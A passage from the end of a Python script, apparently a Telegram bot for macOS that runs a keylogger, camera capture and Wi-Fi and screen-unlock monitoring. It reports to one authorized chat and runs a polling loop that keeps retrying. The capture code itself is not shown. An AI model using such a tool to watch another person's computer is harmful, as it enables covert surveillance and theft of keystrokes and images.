    print(f"INFO: Authorized Chat ID: {AUTHORIZED_CHAT_ID}", flush=True)
    print(f"INFO: Using imagesnap from: {IMAGESNAP_PATH}", flush=True)
    print(f"INFO: Using ffmpeg from: {FFMPEG_PATH}", flush=True)
    print("INFO: Keylogger ('pynput') and other features may require permissions (Accessibility, Camera, Screen Recording).", flush=True)
    print("      Grant these to Python/Terminal in System Settings > Privacy & Security.", flush=True)

    # Start monitoring tasks
    if AUTHORIZED_CHAT_ID: # Ensure chat ID is valid before starting tasks that message it
        print(f"Wi-Fi & Internet monitoring will start for chat ID {AUTHORIZED_CHAT_ID} shortly.", flush=True)
        initial_wifi_monitor_timer = threading.Timer(3.0, wifi_monitoring_task, args=(AUTHORIZED_CHAT_ID,))
        initial_wifi_monitor_timer.start()

        print(f"Screen unlock monitoring will start for chat ID {AUTHORIZED_CHAT_ID} shortly.", flush=True)
        initial_unlock_monitor_timer = threading.Timer(5.0, screen_unlock_monitoring_task, args=(AUTHORIZED_CHAT_ID,)) # Stagger start
        initial_unlock_monitor_timer.start()

    while True:
        try:
            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            print(f"{current_time} - Bot polling started...", flush=True)
            bot.polling(none_stop=True, interval=2, timeout=30) # Adjusted interval and timeout
        except requests.exceptions.ReadTimeout as e:
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Bot polling ReadTimeout: {e}. Retrying in 10 seconds...", flush=True)
            time.sleep(10)
        except requests.exceptions.ConnectionError as e:
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Bot polling connection error: {e}. Retrying in 15 seconds...", flush=True)
            time.sleep(15)
        except telebot.apihelper.ApiException as e:
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Telegram API Exception: {e}. Retrying in 20 seconds...", flush=True)
            # Specific error codes can be checked here, e.g. for bot blocked by user
            time.sleep(20)
        except Exception as e:
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Bot polling encountered an unhandled error: {e}", flush=True)
            import traceback
            traceback.print_exc()
            print("Retrying in 30 seconds...", flush=True)
            time.sleep(30)
